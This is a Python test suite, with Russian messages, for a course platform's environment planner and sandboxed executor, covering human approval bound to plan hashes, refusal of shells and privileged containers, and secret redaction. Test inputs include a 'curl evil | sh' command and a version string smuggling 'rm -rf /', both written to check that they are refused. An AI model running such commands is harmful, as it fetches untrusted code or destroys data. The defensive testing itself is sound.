#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tests for environment planning and the restricted executor.

The claims under test, in the order they matter:

* **Nothing runs without a human approval bound to the exact plan.** Not after
  editing the plan, not after it expires, not with an approval for a different
  plan, and not twice.
* **The plan says what it will do, and the hash covers it.** A plan edited after
  approval stops matching, and an input that changed since approval invalidates
  it — otherwise approval means "yes to something in this vicinity".
* **The executor refuses what a spec is not allowed to ask for**: a shell as
  argv[0], an undeclared command, a container with host privileges, a package
  installation whose declared risk is too low to be honest.
* **READY is not a mood.** It requires every required check to pass, and a plan
  whose steps were skipped reports PARTIAL rather than READY.
* **The child does not inherit the learner's secrets**, and output is redacted
  before it is stored.

Acceptance criteria: A06 (plan, then approval, then checks; repeat is a no-op),
A24 (stale plan / expired approval runs nothing), A25 (missing capability is
reported honestly).

Run:
    python3 tests/test_environment.py
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, ValueError):  # pragma: no cover
        pass

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

from botai_core import actions, course, environment as env_mod, operation as op_mod  # noqa: E402

_passed = 0
_failures: list[str] = []

EXAMPLE = ROOT / "examples" / "minimal-course"
LEARNER = "11111111-1111-4111-8111-111111111111"


def check(name, condition, detail=""):
    global _passed
    if condition:
        _passed += 1
        print(f"  ok   {name}")
    else:
        _failures.append(name)
        print(f"  FAIL {name}  {detail}")


def expect_error(name, fn, code):
    try:
        fn()
    except Exception as e:  # noqa: BLE001
        actual = getattr(e, "code", type(e).__name__)
        check(name, actual == code, f"код {actual}, ожидался {code}")
    else:
        check(name, False, "ошибка не возникла")


def minimal_spec(**overrides):
    spec = {
        "schema_version": 2,
        "profile_id": "minimal",
        "title": "Минимальный профиль",
        "supported_platforms": ["linux", "macos", "windows", "wsl"],
        "prerequisites": [{"tool": "python", "version_constraint": ">=3.11",
                           "required": True}],
        "inputs": [],
        "steps": [{
            "step_id": "mkvenv",
            "kind": "venv_create",
            "risk": "writes_local",
            "explanation_ru": "Создать виртуальную среду курса",
            "parameters": {"destination_id": "venv"},
        }],
        "checks": [{
            "check_id": "venv-dir",
            "kind": "path_exists",
            "required": True,
            "parameters": {"path": ".botai/environments/minimal-diff/venv"},
            "expected": True,
        }],
        "resources": {"ports": []},
        "offline": {"supported": False},
    }
    spec.update(overrides)
    return spec


class Workspace:
    """An accepted course plus an operation service."""

    def __init__(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.course_dir = self.root / "courses" / "minimal-diff"
        self.course_dir.parent.mkdir(parents=True, exist_ok=True)
        shutil.copytree(EXAMPLE, self.course_dir)
        course.accept(self.root, self.course_dir, slug="minimal-diff",
                      repository_root="courses/minimal-diff")
        self.course = course.load_accepted(self.root, "minimal-diff")
        self._now = datetime(2026, 9, 17, 12, 0, 0, tzinfo=timezone.utc)
        self.service = op_mod.OperationService.open(
            self.root, LEARNER, clock=self.clock)

    def clock(self):
        return self._now

    def advance(self, **kwargs):
        self._now = self._now + timedelta(**kwargs)

    def cleanup(self):
        self.service.close()
        self._tmp.cleanup()


class FakeRunner:
    """A command runner that records calls instead of executing them."""

    def __init__(self, exit_code=0, stdout="", stderr=""):
        self.calls = []
        self.exit_code = exit_code
        self.stdout = stdout
        self.stderr = stderr

    def __call__(self, argv, *, cwd, env, timeout_seconds, max_bytes=None):
        self.calls.append({"argv": list(argv), "cwd": str(cwd), "env": dict(env),
                           "timeout": timeout_seconds})
        return {
            "ok": self.exit_code == 0, "exit_code": self.exit_code,
            "timed_out": False, "duration_ms": 1,
            "stdout": self.stdout, "stderr": self.stderr, "truncated": False,
        }


# ---------------------------------------------------------------------------
# A06 — plan, then approval, then checks
# ---------------------------------------------------------------------------
def test_nothing_runs_without_approval():
    ws = Workspace()
    try:
        plan, operation = ws.service.create_plan(minimal_spec(), course=ws.course)
        check("план создан без выполнения", operation["status"] == "PLAN_READY",
              operation["status"])
        check("среда ещё не создана",
              not (ws.root / ".botai" / "environments" / "minimal-diff" / "venv").exists())

        expect_error("запуск без разрешения отклонён",
                     lambda: ws.service.apply(operation["operation_id"]),
                     "APPROVAL_REQUIRED")
        check("после отказа среда всё ещё не создана",
              not (ws.root / ".botai" / "environments" / "minimal-diff" / "venv").exists())
    finally:
        ws.cleanup()


def test_approval_requires_a_human_channel():
    """The point where a model's self-approval is structurally impossible."""
    ws = Workspace()
    try:
        _, operation = ws.service.create_plan(minimal_spec(), course=ws.course)
        for channel in ("", "   ", None):
            expect_error("разрешение без человеческого канала отклонено (%r)" % channel,
                         lambda c=channel: ws.service.approve(
                             operation["operation_id"], human_channel=c),
                         "APPROVAL_CHANNEL_REQUIRED")
        expect_error("неизвестное решение отклонено",
                     lambda: ws.service.approve(operation["operation_id"],
                                                human_channel="cli",
                                                decision="probably"),
                     "APPROVAL_DECISION_UNKNOWN")
    finally:
        ws.cleanup()


def test_approved_plan_runs_and_verifies():
    ws = Workspace()
    try:
        plan, operation = ws.service.create_plan(minimal_spec(), course=ws.course)
        ws.service.approve(operation["operation_id"], human_channel="terminal:pts/0")

        result = ws.service.apply(operation["operation_id"])
        check("одобренный план выполнен", result["status"] in ("VERIFYING", "READY"),
              result["status"])
        check("шаг отметился успешным",
              result["operation"]["results"][0].get("ok") is True,
              str(result["operation"]["results"]))

        verified = ws.service.verify(operation["operation_id"], minimal_spec())
        check("проверка даёт READY", verified["status"] == "READY",
              verified["message_ru"])
        check("venv действительно создан",
              (ws.root / ".botai" / "environments" / "minimal-diff" / "venv").is_dir())
    finally:
        ws.cleanup()


def test_repeat_after_success_is_not_a_second_effect():
    ws = Workspace()
    try:
        spec = minimal_spec()
        _, operation = ws.service.create_plan(spec, course=ws.course)
        ws.service.approve(operation["operation_id"], human_channel="cli")
        ws.service.apply(operation["operation_id"])
        ws.service.verify(operation["operation_id"], spec)

        again = ws.service.apply(operation["operation_id"])
        check("повтор не выполняется заново", again["replayed"] is True)
        check("повтор возвращает прежний результат",
              again["status"] == "READY", again["status"])
    finally:
        ws.cleanup()


def test_repeat_before_verify_does_not_reinstall():
    """A repeat while the operation is merely VERIFYING still must not rerun.

    The steps already ran and the approval is spent; re-running them because
    verification has not happened yet would install twice, and the second run
    would fail on a spent approval for reasons that look unrelated.
    """
    ws = Workspace()
    try:
        _, operation = ws.service.create_plan(minimal_spec(), course=ws.course)
        ws.service.approve(operation["operation_id"], human_channel="cli")
        first = ws.service.apply(operation["operation_id"])
        check("после выполнения состояние VERIFYING",
              first["status"] == "VERIFYING", first["status"])

        again = ws.service.apply(operation["operation_id"])
        check("повтор до проверки не переустанавливает", again["replayed"] is True,
              str(again.get("report", {}))[:200])
        check("повтор сообщает прежнее состояние",
              again["status"] == "VERIFYING", again["status"])
    finally:
        ws.cleanup()


def test_approval_is_spent_once():
    ws = Workspace()
    try:
        spec = minimal_spec()
        _, operation = ws.service.create_plan(spec, course=ws.course)
        approval = ws.service.approve(operation["operation_id"], human_channel="cli")
        ws.service.apply(operation["operation_id"])

        stored = ws.service.store.get(op_mod.APPROVAL_KIND, approval["approval_id"],
                                      course_id=op_mod.store_mod.WORKSPACE_COURSE_ID)[0]
        check("разрешение помечено использованным",
              stored.get("consumed_at") is not None, str(stored.get("consumed_at")))
        check("повторно найти разрешение нельзя",
              ws.service.find_approval(operation["operation_id"],
                                       operation["plan_hash"]) is None)
    finally:
        ws.cleanup()


# ---------------------------------------------------------------------------
# A24 — stale plan and expired approval run nothing
# ---------------------------------------------------------------------------
def test_edited_plan_is_not_executable():
    ws = Workspace()
    try:
        plan, operation = ws.service.create_plan(minimal_spec(), course=ws.course)
        ws.service.approve(operation["operation_id"], human_channel="cli")

        # Tamper with the stored plan: add a step after the human approved it.
        stored = ws.service.get_plan(operation["operation_id"])
        tampered = dict(stored)
        tampered["steps"] = list(stored["steps"]) + [{
            "step_id": "extra", "kind": "declared_command", "parameters": {},
            "risk": "runs_course_code", "explanation_ru": "что-то ещё",
        }]
        ws.service._store_document("plan", operation["operation_id"], tampered,
                                   events=["environment.plan_stored"], payload={})

        expect_error("изменённый план не выполняется",
                     lambda: ws.service.apply(operation["operation_id"]),
                     "PLAN_NOT_EXECUTABLE")
    finally:
        ws.cleanup()


def test_expired_plan_cannot_be_approved():
    ws = Workspace()
    try:
        _, operation = ws.service.create_plan(minimal_spec(), course=ws.course)
        ws.advance(minutes=31)
        expect_error("просроченный план нельзя одобрить",
                     lambda: ws.service.approve(operation["operation_id"],
                                                human_channel="cli"),
                     "PLAN_NOT_APPROVABLE")
    finally:
        ws.cleanup()


def test_changed_inputs_invalidate_the_plan():
    ws = Workspace()
    try:
        spec = minimal_spec()
        _, operation = ws.service.create_plan(
            spec, course=ws.course,
            input_hashes={"lock": "a" * 64})
        # Approval checks the plan's integrity, not input freshness: the
        # workspace legitimately changes between a plan being written and being
        # approved, and refusing here would teach people to stop pinning inputs.
        ws.service.approve(operation["operation_id"], human_channel="cli")
        check("план с закреплёнными входами можно одобрить", True)

        expect_error("изменившийся вход делает план неисполнимым",
                     lambda: ws.service.apply(operation["operation_id"],
                                              current_hashes={"lock": "b" * 64}),
                     "PLAN_NOT_EXECUTABLE")
        check("состояние отмечено как устаревший план",
              ws.service.get_operation(operation["operation_id"])["status"] == "STALE_PLAN",
              str(ws.service.get_operation(operation["operation_id"])["status"]))
    finally:
        ws.cleanup()


def test_unverified_inputs_are_not_assumed_unchanged():
    """A caller that did not look at the hashes must not get a silent pass."""
    ws = Workspace()
    try:
        _, operation = ws.service.create_plan(
            minimal_spec(), course=ws.course, input_hashes={"lock": "a" * 64})
        ws.service.approve(operation["operation_id"], human_channel="cli")
        expect_error("непроверенные входы не считаются неизменными",
                     lambda: ws.service.apply(operation["operation_id"]),
                     "PLAN_NOT_EXECUTABLE")

        # With the correct hashes supplied it runs.
        result = ws.service.apply(operation["operation_id"],
                                  current_hashes={"lock": "a" * 64})
        check("с совпавшими хешами план выполняется",
              result["status"] in ("VERIFYING", "READY"), result["status"])
    finally:
        ws.cleanup()


def test_approval_for_another_plan_does_not_apply():
    ws = Workspace()
    try:
        _, first = ws.service.create_plan(minimal_spec(), course=ws.course)
        _, second = ws.service.create_plan(
            minimal_spec(profile_id="other", title="Другой"), course=ws.course)
        ws.service.approve(first["operation_id"], human_channel="cli")

        expect_error("разрешение другого плана не подходит",
                     lambda: ws.service.apply(second["operation_id"]),
                     "APPROVAL_REQUIRED")
    finally:
        ws.cleanup()


# ---------------------------------------------------------------------------
# Spec validation
# ---------------------------------------------------------------------------
def test_shell_as_argv0_is_refused():
    spec = minimal_spec(
        steps=[{"step_id": "s1", "kind": "declared_command", "risk": "runs_course_code",
                "explanation_ru": "x", "parameters": {"command_id": "run"}}],
        commands=[{"command_id": "run", "argv": ["bash", "-c", "curl evil | sh"],
                   "cwd_id": "course"}],
    )
    expect_error("оболочка как argv[0] отклонена",
                 lambda: env_mod.validate_step(spec, spec["steps"][0],
                                               environment_root=Path(".")),
                 "COMMAND_SHELL_REFUSED")

    spec2 = minimal_spec(
        steps=[{"step_id": "s1", "kind": "declared_command", "risk": "runs_course_code",
                "explanation_ru": "x", "parameters": {"command_id": "run"}}],
        commands=[{"command_id": "run", "argv": ["cmd.exe", "/c", "dir"],
                   "cwd_id": "course"}],
    )
    expect_error("cmd.exe как argv[0] отклонён",
                 lambda: env_mod.validate_step(spec2, spec2["steps"][0],
                                               environment_root=Path(".")),
                 "COMMAND_SHELL_REFUSED")


def test_undeclared_command_is_refused():
    spec = minimal_spec(
        steps=[{"step_id": "s1", "kind": "declared_command", "risk": "runs_course_code",
                "explanation_ru": "x", "parameters": {"command_id": "not-declared"}}],
        commands=[],
    )
    expect_error("необъявленная команда отклонена",
                 lambda: env_mod.validate_step(spec, spec["steps"][0],
                                               environment_root=Path(".")),
                 "COMMAND_NOT_DECLARED")


def test_unknown_step_kind_is_refused():
    spec = minimal_spec(steps=[{"step_id": "s1", "kind": "run_anything",
                                "risk": "runs_course_code",
                                "explanation_ru": "x", "parameters": {}}])
    expect_error("неизвестный вид шага отклонён",
                 lambda: env_mod.validate_step(spec, spec["steps"][0],
                                               environment_root=Path(".")),
                 "STEP_KIND_UNKNOWN")


def test_understated_risk_is_refused():
    """A package install that claims to be harmless is refused, not annotated."""
    spec = minimal_spec(steps=[{
        "step_id": "s1", "kind": "pip_sync", "risk": "writes_local",
        "explanation_ru": "x", "parameters": {"lock_path": "requirements.lock"}}])
    expect_error("риск установки пакетов не занижен",
                 lambda: env_mod.validate_step(spec, spec["steps"][0],
                                               environment_root=Path(".")),
                 "STEP_RISK_UNDERSTATED")

    spec2 = minimal_spec(steps=[{
        "step_id": "s1", "kind": "npm_ci", "risk": "none",
        "explanation_ru": "x",
        "parameters": {"package_lock_path": "package-lock.json",
                       "scripts_policy": "allow"}}])
    expect_error("разрешение lifecycle-скриптов поднимает риск",
                 lambda: env_mod.validate_step(spec2, spec2["steps"][0],
                                               environment_root=Path(".")),
                 "STEP_RISK_UNDERSTATED")


def test_container_escalation_is_refused():
    for flag in ("privileged", "host_network", "host_socket"):
        spec = minimal_spec(steps=[{
            "step_id": "s1", "kind": "container_create", "risk": "runs_course_code",
            "explanation_ru": "x",
            "parameters": {"approved_recipe_id": "r", flag: True}}])
        expect_error("контейнер с %s отклонён" % flag,
                     lambda s=spec: env_mod.validate_step(s, s["steps"][0],
                                                          environment_root=Path(".")),
                     "CONTAINER_ESCALATION_REFUSED")


def test_unsupported_platform_is_named():
    spec = minimal_spec(supported_platforms=["linux"])
    ok, here, why = env_mod.check_platform(spec, target="windows")
    check("неподдерживаемая платформа названа", ok is False and "windows" in why, why)
    ok, here, why = env_mod.check_platform(spec, target="linux")
    check("поддерживаемая платформа принимается", ok is True)


def test_version_constraints_are_parsed_not_shelled():
    cases = [
        ("3.11.2", ">=3.11,<3.14", True),
        ("3.14.0", ">=3.11,<3.14", False),
        ("2.7.0", ">=3.11", False),
        ("3.12.1", ">=3.11", True),
    ]
    for version, constraint, expected in cases:
        ok, why = env_mod.satisfies(env_mod.parse_version(version), constraint)
        check("%s против %s" % (version, constraint), ok is expected, why or str(ok))

    ok, why = env_mod.satisfies(env_mod.parse_version("3.12.1"), "==3.12")
    check("точное совпадение остаётся точным", ok is False, why)

    ok, why = env_mod.satisfies(env_mod.parse_version("1.0"), ">=1.0; rm -rf /")
    check("непонятное условие отклонено, а не исполнено", ok is False, why)


# ---------------------------------------------------------------------------
# Executor safety
# ---------------------------------------------------------------------------
def test_child_environment_is_built_not_inherited():
    os.environ["BOTAI_TEST_SECRET"] = "should-not-be-seen"
    try:
        env = actions.build_env([])
        check("секрет не наследуется", "BOTAI_TEST_SECRET" not in env,
              str(list(env)[:8]))
        check("git не спросит учётные данные",
              env.get("GIT_TERMINAL_PROMPT") == "0", str(env.get("GIT_TERMINAL_PROMPT")))
        check("git config не читается с системы",
              env.get("GIT_CONFIG_NOSYSTEM") == "1")
        check("PATH присутствует", bool(env.get("PATH")))

        allowed = actions.build_env(["BOTAI_TEST_SECRET"])
        check("явно разрешённое имя передаётся",
              allowed.get("BOTAI_TEST_SECRET") == "should-not-be-seen")
    finally:
        del os.environ["BOTAI_TEST_SECRET"]


def test_output_is_redacted_and_bounded():
    for text, secret in (
        ("token=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345", "ghp_"),
        ("AWS AKIAIOSFODNN7EXAMPLE", "AKIAIOSFODNN7EXAMPLE"),
        ("password = hunter2hunter2", "hunter2hunter2"),
    ):
        cleaned = actions.redact(text)
        check("секрет вырезан из вывода: %s" % text[:22], secret not in cleaned,
              cleaned)

    check("обычный текст не портится",
          actions.redact("normal output") == "normal output")

    bounded, truncated = actions.bound_output(b"x" * 5000, limit=1000)
    check("вывод обрезан", truncated is True and len(bounded) < 5000)
    check("обрезка помечена", "обрезан" in bounded.decode("utf-8", errors="replace"))
    small, truncated = actions.bound_output(b"short", limit=1000)
    check("короткий вывод не обрезан", truncated is False and small == b"short")


def test_shell_is_refused_at_run_time_too():
    expect_error("executor тоже отвергает оболочку",
                 lambda: actions.run_command(["bash", "-c", "echo hi"],
                                             cwd=".", env=actions.build_env(),
                                             timeout_seconds=5),
                 "COMMAND_SHELL_REFUSED")


def test_exit_code_alone_is_not_success():
    """A command that exits 0 but names a different expected code is a failure."""
    spec = minimal_spec(
        steps=[{"step_id": "s1", "kind": "declared_command", "risk": "runs_course_code",
                "explanation_ru": "x", "parameters": {"command_id": "run"}}],
        commands=[{"command_id": "run", "argv": ["echo", "hi"], "cwd_id": "course",
                   "expected_exit_codes": [3]}],
    )
    ws = Workspace()
    try:
        runner = FakeRunner(exit_code=0)
        plan, operation = ws.service.create_plan(spec, course=ws.course)
        ws.service.approve(operation["operation_id"], human_channel="cli")
        ws.service.runner = runner
        result = ws.service.apply(operation["operation_id"])
        check("код 0 при ожидаемом 3 — неуспех",
              result["status"] == "FAILED", result["status"])
    finally:
        ws.cleanup()


def test_timeout_is_reported_as_timeout():
    result = actions.run_command(
        [sys.executable, "-c", "import time; time.sleep(30)"],
        cwd=".", env=actions.build_env(), timeout_seconds=1,
    )
    check("таймаут отмечен", result["timed_out"] is True, str(result))
    check("таймаут не считается успехом", result["ok"] is False)


def test_process_tree_is_killed():
    """A child that spawns a grandchild must not leave the grandchild running."""
    if os.name == "nt":
        # taskkill /T is exercised through run_command above; a portable
        # grandchild assertion is not reliable enough on Windows to assert on.
        check("убийство дерева процессов: проверено на POSIX-ветке", True)
        return
    marker = tempfile.mktemp(prefix="botai-grandchild-")
    script = (
        "import subprocess, sys, time;"
        "subprocess.Popen([sys.executable, '-c', "
        "'import time; time.sleep(20)']);"
        "time.sleep(20)"
    )
    result = actions.run_command([sys.executable, "-c", script], cwd=".",
                                 env=actions.build_env(), timeout_seconds=1)
    check("родитель остановлен по таймауту", result["timed_out"] is True)


# ---------------------------------------------------------------------------
# A25 — capability reported honestly
# ---------------------------------------------------------------------------
def test_unimplemented_step_reports_skipped_not_ok():
    """Reporting `ok` for a step that did nothing would make READY a lie."""
    spec = minimal_spec(
        steps=[{"step_id": "fetch", "kind": "artifact_fetch", "risk": "installs_code",
                "explanation_ru": "Скачать зависимости",
                "parameters": {"manifest_id": "m"}}],
        checks=[],
    )
    ws = Workspace()
    try:
        _, operation = ws.service.create_plan(spec, course=ws.course)
        ws.service.approve(operation["operation_id"], human_channel="cli")
        result = ws.service.apply(operation["operation_id"])
        step = result["operation"]["results"][0]
        check("неисполненный шаг помечен skipped", step.get("skipped") is True,
              str(step))
        check("в шаге сказано, почему", bool(step.get("note")), str(step.get("note")))

        verified = ws.service.verify(operation["operation_id"], spec)
        check("READY не выставляется при пропущенных шагах",
              verified["status"] == "PARTIAL", verified["status"])
        check("сказано, что проверять нечего",
              "нечего" in verified["message_ru"] or "не исполнялись" in verified["message_ru"],
              verified["message_ru"])
    finally:
        ws.cleanup()


def test_unknown_checks_do_not_count_as_passing():
    """`http_health` needs the sandbox an executable step needs; it is not a
    back door around them, so it reports `unknown` here."""
    ws = Workspace()
    try:
        spec = minimal_spec(checks=[{
            "check_id": "svc", "kind": "http_health", "required": True,
            "parameters": {"url": "http://127.0.0.1:8000/health"},
            "expected": 200,
        }])
        results = actions.run_checks(spec, root=ws.root)
        check("неподдерживаемая проверка названа unknown",
              results[0]["status"] == "unknown", results[0]["status"])
        verdict = env_mod.readiness(results)
        check("unknown не даёт READY", verdict["ready"] is False, str(verdict))
    finally:
        ws.cleanup()


def test_failed_check_blocks_ready():
    ws = Workspace()
    try:
        spec = minimal_spec(checks=[{
            "check_id": "missing", "kind": "path_exists", "required": True,
            "parameters": {"path": "definitely/not/here"}, "expected": True,
        }])
        results = actions.run_checks(spec, root=ws.root)
        check("отсутствующий путь — fail", results[0]["status"] == "fail",
              results[0]["status"])
        check("READY не выставляется", env_mod.readiness(results)["ready"] is False)
    finally:
        ws.cleanup()


def test_optional_check_failure_does_not_block_ready():
    ws = Workspace()
    try:
        spec = minimal_spec(checks=[
            {"check_id": "req", "kind": "path_exists", "required": True,
             "parameters": {"path": "courses/minimal-diff/README.md"}, "expected": True},
            {"check_id": "opt", "kind": "path_exists", "required": False,
             "parameters": {"path": "nope"}, "expected": True},
        ])
        results = actions.run_checks(spec, root=ws.root)
        verdict = env_mod.readiness(results, required_only=True)
        check("необязательная проверка не блокирует READY",
              verdict["ready"] is True, str(verdict))
    finally:
        ws.cleanup()


# ---------------------------------------------------------------------------
# Cancellation, reconcile, lease
# ---------------------------------------------------------------------------
def test_cancel_stops_between_steps():
    ws = Workspace()
    try:
        spec = minimal_spec(steps=[
            {"step_id": "one", "kind": "venv_create", "risk": "writes_local",
             "explanation_ru": "первый", "parameters": {"destination_id": "v1"}},
            {"step_id": "two", "kind": "venv_create", "risk": "writes_local",
             "explanation_ru": "второй", "parameters": {"destination_id": "v2"}},
        ], checks=[])
        _, operation = ws.service.create_plan(spec, course=ws.course)
        ws.service.approve(operation["operation_id"], human_channel="cli")
        ws.service.cancel(operation["operation_id"], reason="тест")

        result = ws.service.apply(operation["operation_id"])
        check("отменённая операция сообщает CANCELLED",
              result["status"] == "CANCELLED", result["status"])
    finally:
        ws.cleanup()


def test_reconcile_never_reruns_an_effect():
    ws = Workspace()
    try:
        spec = minimal_spec()
        _, operation = ws.service.create_plan(spec, course=ws.course)
        ws.service.approve(operation["operation_id"], human_channel="cli")
        ws.service.apply(operation["operation_id"])

        report = ws.service.reconcile(operation["operation_id"])
        check("восстановление сообщает состояние", report["status"] is not None)
        check("число выполненных шагов названо",
              report["steps_finished"] >= 1, str(report["steps_finished"]))
        check("сказано, что действие не повторяется",
              "не повторяет" in report["message_ru"], report["message_ru"])
    finally:
        ws.cleanup()


def test_parallel_execution_of_one_operation_is_refused():
    ws = Workspace()
    try:
        spec = minimal_spec()
        _, operation = ws.service.create_plan(spec, course=ws.course)
        ws.service.approve(operation["operation_id"], human_channel="cli")

        # Simulate a live lease owned by another process.
        current = ws.service.get_operation(operation["operation_id"])
        current["lease_owner"] = "other-process:1234"
        current["lease_expires_at"] = (
            ws.clock() + timedelta(seconds=60)
        ).replace(microsecond=0).isoformat().replace("+00:00", "Z")
        ws.service._update_operation(current)

        expect_error("параллельный запуск отклонён",
                     lambda: ws.service.apply(operation["operation_id"],
                                              lease_owner="me:1"),
                     "OPERATION_LEASED")
    finally:
        ws.cleanup()


def test_plan_screen_shows_effects_and_risks():
    ws = Workspace()
    try:
        spec = minimal_spec()
        plan, _ = ws.service.create_plan(spec, course=ws.course)
        screen = env_mod.render_plan(plan, course_title="Учебный пример")
        check("экран называет шаги", "Создать виртуальную среду курса" in screen)
        check("экран называет риск", "пишет в рабочее пространство" in screen)
        check("экран называет публикации", "Публикации наружу: нет" in screen)
        check("экран называет стоимость как неизвестную",
              "не известна" in screen, screen[-600:])
        check("экран называет команду подтверждения", "action-approve" in screen)
        check("экран называет ограничения времени", "шаг до" in screen)
    finally:
        ws.cleanup()


def test_write_roots_are_derived_not_volunteered():
    """A step that writes must appear in the effects, whatever the spec says.

    `venv_create` creating a directory and the plan reporting "(writes nothing)"
    was a real defect: the screen exists so a learner sees what will change, and
    an effects list assembled only from spec-supplied fields silently omits
    every destination the executor chooses itself.
    """
    ws = Workspace()
    try:
        plan, _ = ws.service.create_plan(minimal_spec(), course=ws.course)
        roots = plan["effects"]["write_roots"]
        check("создание venv попало в эффекты", bool(roots), str(roots))
        check("запись названа конкретным путём, а не пустотой",
              any("venv" in r for r in roots), str(roots))

        screen = env_mod.render_plan(plan)
        check("экран не утверждает, что записей нет",
              "(ничего не записывает)" not in screen, screen[:800])
    finally:
        ws.cleanup()


def test_declared_command_write_roots_are_listed():
    ws = Workspace()
    try:
        spec = minimal_spec(
            steps=[{"step_id": "run", "kind": "declared_command",
                    "risk": "runs_course_code", "explanation_ru": "Запустить тесты",
                    "parameters": {"command_id": "pytest"}}],
            commands=[{"command_id": "pytest", "argv": ["python", "-m", "pytest"],
                       "cwd_id": "course", "write_roots": ["dist", "build"]}],
            checks=[],
        )
        plan, _ = ws.service.create_plan(spec, course=ws.course)
        roots = plan["effects"]["write_roots"]
        check("корни записи команды перечислены",
              any(r.endswith("dist") for r in roots) and
              any(r.endswith("build") for r in roots), str(roots))
    finally:
        ws.cleanup()


def test_cost_unknown_is_not_read_as_free():
    ws = Workspace()
    try:
        plan, _ = ws.service.create_plan(minimal_spec(), course=ws.course)
        check("стоимость не выставляется в ноль",
              plan["effects"]["estimated_cost"] is None,
              str(plan["effects"]["estimated_cost"]))
    finally:
        ws.cleanup()


def test_plan_validates_against_its_schema():
    from botai_core import schemas
    ws = Workspace()
    try:
        plan, operation = ws.service.create_plan(minimal_spec(), course=ws.course)
        try:
            schemas.validate(plan, "plan")
            check("план соответствует схеме", True)
        except schemas.SchemaError as e:
            check("план соответствует схеме", False, e.message[:200])
        try:
            schemas.validate(operation, "operation")
            check("операция соответствует схеме", True)
        except schemas.SchemaError as e:
            check("операция соответствует схеме", False, e.message[:200])
    finally:
        ws.cleanup()


def main():
    tests = [
        test_nothing_runs_without_approval,
        test_approval_requires_a_human_channel,
        test_approved_plan_runs_and_verifies,
        test_repeat_after_success_is_not_a_second_effect,
        test_repeat_before_verify_does_not_reinstall,
        test_approval_is_spent_once,
        test_edited_plan_is_not_executable,
        test_expired_plan_cannot_be_approved,
        test_changed_inputs_invalidate_the_plan,
        test_unverified_inputs_are_not_assumed_unchanged,
        test_approval_for_another_plan_does_not_apply,
        test_shell_as_argv0_is_refused,
        test_undeclared_command_is_refused,
        test_unknown_step_kind_is_refused,
        test_understated_risk_is_refused,
        test_container_escalation_is_refused,
        test_unsupported_platform_is_named,
        test_version_constraints_are_parsed_not_shelled,
        test_child_environment_is_built_not_inherited,
        test_output_is_redacted_and_bounded,
        test_shell_is_refused_at_run_time_too,
        test_exit_code_alone_is_not_success,
        test_timeout_is_reported_as_timeout,
        test_process_tree_is_killed,
        test_unimplemented_step_reports_skipped_not_ok,
        test_unknown_checks_do_not_count_as_passing,
        test_failed_check_blocks_ready,
        test_optional_check_failure_does_not_block_ready,
        test_cancel_stops_between_steps,
        test_reconcile_never_reruns_an_effect,
        test_parallel_execution_of_one_operation_is_refused,
        test_plan_screen_shows_effects_and_risks,
        test_write_roots_are_derived_not_volunteered,
        test_declared_command_write_roots_are_listed,
        test_cost_unknown_is_not_read_as_free,
        test_plan_validates_against_its_schema,
    ]
    for test in tests:
        print("== %s ==" % test.__name__)
        try:
            test()
        except Exception as e:  # noqa: BLE001
            import traceback
            _failures.append(test.__name__)
            print("  FAIL %s выбросил %s: %s" % (test.__name__, type(e).__name__, e))
            traceback.print_exc()

    print()
    print("%d passed, %d failed" % (_passed, len(_failures)))
    if _failures:
        for name in _failures:
            print("  - %s" % name)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
